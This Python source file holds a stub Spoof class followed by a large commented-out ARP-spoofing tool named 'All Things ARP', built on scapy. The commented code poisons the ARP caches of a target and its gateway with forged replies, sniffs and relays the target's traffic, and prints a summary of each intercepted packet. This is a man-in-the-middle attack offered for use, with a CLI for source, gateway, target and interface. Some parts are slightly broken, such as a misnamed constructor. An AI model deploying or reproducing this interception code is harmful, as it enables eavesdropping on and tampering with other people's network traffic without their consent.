#!/usr/bin/python3
class Spoof:
	def __init__(self, target="192.168.0.1"):
		self.target = target

	def Initiate(self):
		print("Successfully loaded the spoof module.")

# from main import *

# REQUIRED_FLAGS = [ '-s', '-g', '-t', '-i' ]
# HELP_MESSAGE = f"""ATA ({colorama.Fore.RED}All Things ARP{colorama.Fore.WHITE}):
# Intercept packets on other devices on your network.

# [Required]:
# {colorama.Style.DIM}[{colorama.Style.RESET_ALL}-s{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the source of the attack.
# {colorama.Style.DIM}[{colorama.Style.RESET_ALL}-g{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the gateway.
# {colorama.Style.DIM}[{colorama.Style.RESET_ALL}-t{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the target of the attack.
# {colorama.Style.DIM}[{colorama.Style.RESET_ALL}-i{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Define the network interface.

# [Optional]:
# {colorama.Style.DIM}[{colorama.Style.RESET_ALL}-h{colorama.Style.DIM}]{colorama.Style.RESET_ALL} Print the help display."""

# DEFAULT_DROP = 2
# DEFAULT_INTERVAL = 0.1
# DEFAULT_DURATION = 30

# MAX_DURATION = 300

# try:
# 	if '-h' in sys.argv:
# 		PrintHelp(HELP_MESSAGE)
# 		sys.exit()
# 	if not ValidateFlags(sys.argv, REQUIRED_FLAGS):
# 		PrintMessage("Please provided the required criteria.")
# 		sys.exit()

# 	parameters = { 'Source': None, 'Gateway': None, 'Target': None, 'Interface': None }
# 	parameters = PopulateFields(parameters)

# 	addresses = [ parameters['Source'], parameters['Gateway'], parameters['Target'] ]
# 	if not CheckFields(addresses):
# 		PrintMessage("There was an error whilst verifying the provided addresses.")
# 		PrintMessage(f"Addresses:\n{parameters['Source']}\n{parameters['Gateway']}\n{parameters['Target']}\n{parameters['Interface']}")
# 		sys.exit()

# 	spoof = Spoof()
# 	spoof.interval = DEFAULT_INTERVAL

# 	# source_mac = spoof.GetMAC(parameters['Source'], DEFAULT_DROP)
# 	source_mac = '2c:fd:a1:61:2d:d3'
# 	gateway_mac = spoof.GetMAC(parameters['Gateway'], DEFAULT_DROP)
# 	target_mac = spoof.GetMAC(parameters['Target'], DEFAULT_DROP)

# 	physicals = [ source_mac, target_mac, gateway_mac ]
# 	if not CheckFields(physicals):
# 		PrintMessage("There was an error whilst verifying the physical addresses of the provided IP addresses.")
# 		PrintMessage(f"MAC Addresses:\n({parameters['Source']} : {source_mac})\n({parameters['Gateway']} : {gateway_mac})\n({parameters['Target']} : {target_mac})")
# 		sys.exit()

# 	spoof.source = parameters['Source']
# 	spoof.target = parameters['Target']
# 	spoof.gateway = parameters['Gateway']
# 	spoof.sourcemac = source_mac
# 	spoof.targetmac = target_mac
# 	spoof.gatewaymac = gateway_mac

# 	stop_event = threading.Event()

# 	spoof_thread = threading.Thread(target=spoof.Spoof)
# 	tx_thread = threading.Thread(target=spoof.ForwardSent)
# 	rx_thread = threading.Thread(target=spoof.ForwardReceived)

# 	spoof_thread.start()
# 	tx_thread.start()
# 	rx_thread.start()

# 	counter = 0
# 	while counter < DEFAULT_DURATION:
# 		if counter == DEFAULT_DURATION or counter == MAX_DURATION:
# 			stop_event.set()
# 			spoof.Reset()
# 		counter += 1
# 		time.sleep(1)
# except KeyboardInterrupt:
# 	spoof_thread.join()
# 	tx_thread.join()
# 	rx_thread.join()

# 	stop_event.set()
# 	spoof.Reset()
# except TypeError:
# 	PrintMessage("There was a type error. Please verify the integrity of the script.")








# import colorama, time, sys, subprocess, threading
# from scapy.all import *

# class Spoof:
# 	import threading
# 	stop = threading.Event()

# 	def __self__(self, interface, interval, source, gateway, target, sourcemac, gatewaymac, targetmac):
# 		self.interface = interface
# 		self.interval = interval

# 		self.source = source
# 		self.gateway = gateway
# 		self.target = target

# 		self.sourcemac = sourcemac
# 		self.gatewaymac = gatewaymac
# 		self.targetmac = targetmac

# 	def GetMAC(self, destination, timeout):
# 		request = ARP(op=1, pdst=destination)
# 		response = sr1(request, timeout=timeout, verbose=False)

# 		if response:
# 			return response.hwsrc
# 		return None

# 	def Reset(self):
# 		gateway_packet = ARP(op=2, psrc=self.gateway, pdst=self.target, hwsrc=self.gatewaymac, hwdst=self.targetmac)
# 		target_packet = ARP(op=2, psrc=self.target, pdst=self.gateway, hwsrc=self.targetmac, hwdst=self.gatewaymac)

# 		send(gateway_packet, count=1, verbose=False)
# 		send(target_packet, count=1, verbose=False)

# 		PrintMessage(f"({gateway_packet.summary()} : {target_packet.summary()})")
# 		PrintMessage("Exiting gracefully.")
# 		sys.exit()

# 	def Spoof(self):
# 		gateway_packet = Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc=self.gateway, pdst=self.target, hwsrc=self.sourcemac, hwdst=self.targetmac)
# 		target_packet = Ether(dst="FF:FF:FF:FF:FF:FF") / ARP(op=2, psrc=self.target, pdst=self.gateway, hwsrc=self.sourcemac, hwdst=self.gatewaymac)

# 		while True:
# 			send(gateway_packet, count=1, verbose=False)
# 			send(target_packet,  count=1, verbose=False)

# 			time.sleep(self.interval)

# 	def ForwardSent(self):
# 		while True:
# 			packet = sniff(filter="ip", count=1)[0]

# 			if not packet.haslayer(IP): continue

# 			if packet[IP].src == self.target:
# 				PrintMessage(f"(Sent) {packet.summary()}")
# 				send(packet, count=1, verbose=False)

# 			time.sleep(self.interval)

# 	def ForwardReceived(self):
# 		while True:
# 			packet = sniff(filter="ip", count=1)[0]

# 			if not packet.haslayer(IP): continue

# 			if packet[IP].dst == self.target:
# 				PrintMessage(f"(Received) {packet.summary()}", 0)
# 				send(packet, count=1, verbose=False)

# 			time.sleep(self.interval)

# def CheckFields(fields):
# 		for field in fields:
# 			if not field: return False
# 		return True

# def ValidateFlags(flags, required):
# 	for flag in required:
# 		if flag not in flags:
# 			return False
# 	return True

# def PopulateFields(parameters):
# 	for argument in range(0, len(sys.argv)):
# 		match sys.argv[argument]:
# 			case '-s':
# 				parameters["Source"] = sys.argv[argument + 1]
# 			case '-g':
# 				parameters["Gateway"] = sys.argv[argument + 1]
# 			case '-t':
# 				parameters["Target"] = sys.argv[argument + 1]
# 			case '-i':
# 				parameters["Interface"] = sys.argv[argument + 1]
# 	return parameters

# def PrintHelp(message):
# 	print(message)
# 	sys.exit()

# def PrintMessage(message):
# 	print(f"{colorama.Style.DIM}[{colorama.Style.RESET_ALL}{colorama.Style.RESET_ALL}*{colorama.Style.DIM}]{colorama.Style.RESET_ALL} {message}")
